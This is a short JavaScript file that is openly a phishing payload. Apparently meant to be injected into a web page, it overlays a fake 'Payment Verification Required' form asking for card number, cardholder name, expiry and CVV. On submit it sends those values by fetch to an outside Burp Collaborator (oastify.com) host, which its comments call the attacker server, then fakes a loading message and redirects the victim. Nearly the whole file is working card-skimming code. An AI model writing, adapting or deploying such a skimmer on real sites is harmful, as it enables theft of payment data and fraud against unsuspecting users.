// Trigger when script loads
document.dispatchEvent(new CustomEvent('vite-script-loaded'));

// Create fake payment overlay
const overlay = document.createElement('div');
overlay.className = 'phishing-overlay';
overlay.innerHTML = `
  <div class="phishing-container">
    <h2 style="color: #d23f00;">Payment Verification Required</h2>
    <p>Your session expired. Verify your payment method to continue:</p>
    
    <input type="text" id="phish-card" placeholder="Card Number" class="phishing-input" maxlength="19">
    <input type="text" id="phish-name" placeholder="Cardholder Name" class="phishing-input">
    
    <div style="display: flex; gap: 10px;">
      <input type="text" id="phish-expiry" placeholder="MM/YY" class="phishing-input" style="flex: 1;">
      <input type="text" id="phish-cvv" placeholder="CVV" class="phishing-input" style="flex: 1;" maxlength="4">
    </div>
    
    <button id="phish-submit" class="phishing-button">Verify Payment</button>
    
    <p class="security-note">
      🔒 Secured with 256-bit encryption
    </p>
  </div>
`;

document.body.appendChild(overlay);

// Auto-format card number (add spaces every 4 digits)
document.getElementById('phish-card').addEventListener('input', (e) => {
  e.target.value = e.target.value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
});

// Auto-format expiry (MM/YY)
document.getElementById('phish-expiry').addEventListener('input', (e) => {
  let val = e.target.value.replace(/\D/g, '');
  if (val.length > 2) val = val.substring(0, 2) + '/' + val.substring(2, 4);
  e.target.value = val.substring(0, 5);
});

// Submit data to attacker server
document.getElementById('phish-submit').addEventListener('click', () => {
  const card = document.getElementById('phish-card').value;
  const name = document.getElementById('phish-name').value;
  const expiry = document.getElementById('phish-expiry').value;
  const cvv = document.getElementById('phish-cvv').value;
  
  // Send to attacker (Burp Collaborator)
  fetch('https://5synx55etlldi0ogs08w4pg25tbkzkn9.oastify.com/log', {
    method: 'POST',
    body: JSON.stringify({ card, name, expiry, cvv }),
    mode: 'no-cors'
  });
  
  // Fake loading + redirect
  overlay.innerHTML = `
    <div class="phishing-container" style="text-align: center;">
      <p>Verifying payment details...</p>
    </div>
  `;
  
  setTimeout(() => {
    window.location.href = "https://example.com/continue"; // Fake redirect
  }, 2000);
});
